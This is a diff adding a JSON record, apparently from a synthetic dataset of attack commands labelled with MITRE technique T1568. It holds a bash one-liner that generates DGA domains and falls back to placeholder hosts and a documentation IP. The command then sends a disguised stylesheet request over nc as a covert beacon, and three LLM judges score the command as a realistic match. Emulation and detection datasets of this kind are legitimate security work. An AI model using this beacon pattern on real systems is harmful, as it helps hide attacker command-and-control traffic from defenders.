@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"tld=$(printf 'com\\nnet\\norg\\nio\\ninfo' | shuf -n1); seed=$(date -u +%j%H%M)${RANDOM}; sha=$(printf '%s' \\\"$seed\\\" | sha1sum | cut -d' ' -f1); d=\\\"${sha:0:8}.$tld\\\"; host=''; ip=''; for h in \\\"$d\\\" cdn-images.example.$tld static-content.example.$tld; do ip=$(dig +short \\\"$h\\\" | head -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ip=${ip:-198.51.100.23}; host=${host:-mirror.example.$tld}; ua=\\\"Mozilla/5.0\\\"; printf 'GET /style.css HTTP/1.1\\r\\nHost: %s\\r\\nAccept: text/css,*/*;q=0.1\\r\\nUser-Agent: %s\\r\\nConnection: close\\r\\n\\r\\n' \\\"$host\\\" \\\"$ua\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Builds a TLD-rotating DGA domain, resolves it at runtime, and falls back to a reserved documentation IP if DNS fails; uses a CSS fetch to mimic normal browsing activity.",
+  "rationale_steps": [
+    "Select TLD randomly and derive a DGA domain using a time-based seed.",
+    "Resolve domain with dig; if it fails, use a fallback IP.",
+    "Leverage Host header for virtual hosting to emulate a CDN asset.",
+    "Send realistic HTTP GET for a stylesheet via nc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-d5e96a0e",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, valid flag formats, correct command separators, and appropriate escape sequences throughout the complex bash script.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by generating algorithmically determined domains (DGA-like behavior), attempting resolution with fallbacks, and establishing communication that mimics legitimate traffic patterns.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:56:26.991536Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct variable assignments, command substitutions, loop structures, proper quoting, and valid bash syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully and realistically implements the T1568 technique by generating a TLD-rotating DGA domain at runtime, dynamically resolving it, including robust fallbacks, and beaconing via camouflaged HTTP traffic to mimic normal browsing.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T04:56:43.513954Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid bash constructs, proper escaping, and correct use of pipelines, loops, and substitutions.",
+        "semantic_score": 5,
+        "semantic_justification": "Implements DGA-like dynamic domain generation with TLD rotation, runtime DNS resolution, fallback hosts/IP, and a plausible HTTP GET via nc, aligning with T1568 behaviors.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:57:07.209389Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
